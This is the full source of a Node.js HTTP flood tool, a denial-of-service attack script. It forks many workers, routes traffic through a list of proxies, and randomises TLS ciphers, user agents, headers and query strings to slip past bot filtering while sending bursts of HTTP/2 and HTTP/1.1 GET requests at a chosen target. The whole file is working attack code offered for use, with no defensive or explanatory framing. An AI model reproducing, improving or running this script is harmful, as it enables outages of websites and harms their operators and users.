const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(`Usage: node script.js target time rate thread proxyfile`);
    process.exit();
}

const ciphers = [
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-SHA:AES256-SHA:DES-CBC3-SHA",
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384"
];

const sigals = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];

const ecdhCurve = [
    "P-256:P-384:P-521",
    "X25519"
];

const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'application/json',
    'text/plain, */*; q=0.01',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
];
const lang_header = [
    'en-US,en;q=0.9', 'es-ES,es;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9', 'de-DE,de;q=0.9', 'fr-FR,fr;q=0.9'
];
const encoding_header = [
    'gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, deflate, lzma, sdch', 'br'
];
const user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0"
];

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
}

function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31m' + 'Rate: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            } else {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error.message);
        });
    }
}

const Socker = new NetSocket();

function generateTlsOptions() {
    const selectedCiphers = randomChoice(ciphers);
    const useTls13 = selectedCiphers.startsWith("TLS_");

    return {
        ciphers: selectedCiphers,
        sigals: randomChoice(sigals),
        ecdhCurve: randomChoice(ecdhCurve),
        secureProtocol: useTls13 ? 'TLSv1_3_method' : 'TLSv1_2_method',
        rejectUnauthorized: false,
        ALPNProtocols: ["h2", "http/1.1"],
        servername: parsedTarget.host,
        secure: true,
        host: parsedTarget.host
    };
}

function attackHTTP2(connection) {
    const tlsOptions = generateTlsOptions();

    const tlsConn = tls.connect(443, parsedTarget.host, {
        ...tlsOptions,
        socket: connection,
    });

    const client = http2.connect(parsedTarget.href, {
        createConnection: () => tlsConn,
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        }
    });

    client.on("connect", () => {
        const headers = {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + randstr(5) + "=" + randstr(10),
            "user-agent": randomChoice(user_agents),
            "accept": randomChoice(accept_header),
            "accept-language": randomChoice(lang_header),
            "accept-encoding": randomChoice(encoding_header),
            "cache-control": "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": "1",
            "x-requested-with": "XMLHttpRequest"
        };
        for (let i = 0; i < args.Rate; i++) {
            const request = client.request(headers);
            request.on("response", () => {
                request.close();
            });
            request.end();
        }
    });

    client.on("error", () => {
        client.destroy();
        connection.destroy();
    });

    client.on("close", () => {
        client.destroy();
        connection.destroy();
    });
}

function attackHTTP1(connection) {
    const tlsOptions = generateTlsOptions();
    
    const tlsConn = tls.connect(443, parsedTarget.host, {
        ...tlsOptions,
        socket: connection,
    });

    tlsConn.on('secureConnect', () => {
        const path = parsedTarget.path + "?" + randstr(5) + "=" + randstr(10);
        const requestPayload = `GET ${path} HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nConnection: Keep-Alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: ${randomChoice(user_agents)}\r\nAccept: ${randomChoice(accept_header)}\r\nAccept-Encoding: ${randomChoice(encoding_header)}\r\nAccept-Language: ${randomChoice(lang_header)}\r\n\r\n`;
        for (let i = 0; i < args.Rate; i++) {
            tlsConn.write(requestPayload);
        }
    });

    tlsConn.on('error', () => {
        tlsConn.destroy();
        connection.destroy();
    });

    tlsConn.on('close', () => {
        tlsConn.destroy();
        connection.destroy();
    });
}

function runFlooder() {
    const proxyAddr = randomChoice(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 5
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            return;
        }

        if (Math.random() > 0.5) {
            attackHTTP2(connection);
        } else {
            attackHTTP1(connection);
        }
    });
}
